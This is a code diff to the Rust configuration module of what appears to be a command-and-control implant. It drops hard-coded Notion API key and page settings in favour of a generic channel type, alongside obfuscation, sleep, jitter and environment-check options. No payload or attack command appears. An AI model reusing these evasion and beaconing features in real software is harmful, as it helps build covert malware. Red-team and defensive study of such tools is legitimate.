@@ -8,29 +8,30 @@ use base64::encode;
 use litcrypt::lc;
 use crate::env_check::EnvCheck;
 
+
+use crate::channels::{Channel, ChannelType};
+
 // Config consts
-pub const URL_BASE: &str = "https://api.notion.com/v1";
-pub const DEFAULT_API_KEY: &str = "<<API_KEY>>";
-pub const DEFAULT_PARENT_PAGE_ID: &str = "<<PARENT_PAGE_ID>>";
 pub const DEFAULT_SLEEP_INTERVAL: &str = "<<SLEEP>>";
 pub const DEFAULT_JITTER_TIME: &str = "<<JITTER>>";
+pub const DEFAULT_CONFIG_FILE_PATH: &str = "./cfg.json";
 pub const DEFAULT_LAUNCH_APP: &str = "<<LAUNCH_APP>>";
 pub const DEFAULT_LOG_LEVEL: &str = "<<LOG_LEVEL>>";
-pub const DEFAULT_CONFIG_FILE_PATH: &str = "./cfg.json";
 pub const DEFAULT_ENV_CHECKS: &str = "<<ENV_CHECKS>>";
+pub const DEFAULT_CHANNEL_TYPE: &str = "<<CHANNEL_TYPE>>";
+pub const DEFAULT_CHANNEL: &str = "<<CHANNEL>>";
 
 /// Enum for ConfigOptions, useful for parsing configs from 
 /// arbitrary data.
 #[derive(Debug, Serialize, Deserialize)]
 pub enum ConfigOption {
-    ApiKey(String),
-    ParentPage(String),
     Sleep(u64),
     Jitter(u64),
-    LaunchApp(bool),
     ConfigPath(String),
+    LaunchApp(String),
     LogLevel(u64),
-    EnvChecks(Vec<EnvCheck>)
+    EnvChecks(Vec<EnvCheck>),
+    ChannelType(ChannelType),
 }
 
 
@@ -44,14 +45,13 @@ pub enum ConfigOption {
 /// 
 #[derive(Debug, Serialize, Deserialize)]
 pub struct ConfigOptions {
-    pub api_key: String,
-    pub parent_page_id: String,
     pub sleep_interval: u64,
     pub jitter_time: u64,
-    pub launch_app: bool,
     pub log_level: u64,
+    pub launch_app: String,
     pub config_file_path: String,
-    pub env_checks: Vec<EnvCheck>
+    pub env_checks: Vec<EnvCheck>,
+    pub channel_type: ChannelType,
 }
 
 
@@ -82,12 +82,11 @@ pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
     let config_options = ConfigOptions {
         sleep_interval: DEFAULT_SLEEP_INTERVAL.parse().unwrap_or_else(|_| 10),
         jitter_time: DEFAULT_JITTER_TIME.parse().unwrap_or_else(|_| 0),
-        parent_page_id: DEFAULT_PARENT_PAGE_ID.to_string(),
-        api_key: DEFAULT_API_KEY.to_string(),
-        config_file_path: DEFAULT_CONFIG_FILE_PATH.to_string(),
-        launch_app: DEFAULT_LAUNCH_APP.parse().unwrap_or_default(),
+        launch_app: DEFAULT_LAUNCH_APP.to_string(),
         log_level: DEFAULT_LOG_LEVEL.parse().unwrap_or_else(|_| 2),
-        env_checks: from_str(DEFAULT_ENV_CHECKS).unwrap_or_else(|_| Vec::new())
+        config_file_path: DEFAULT_CONFIG_FILE_PATH.to_string(),
+        env_checks: from_str(DEFAULT_ENV_CHECKS).unwrap_or_else(|_| Vec::new()),
+        channel_type: from_str(DEFAULT_CHANNEL_TYPE).unwrap_or_else(|_| ChannelType::Unknown),
     };
     
     Ok(config_options)
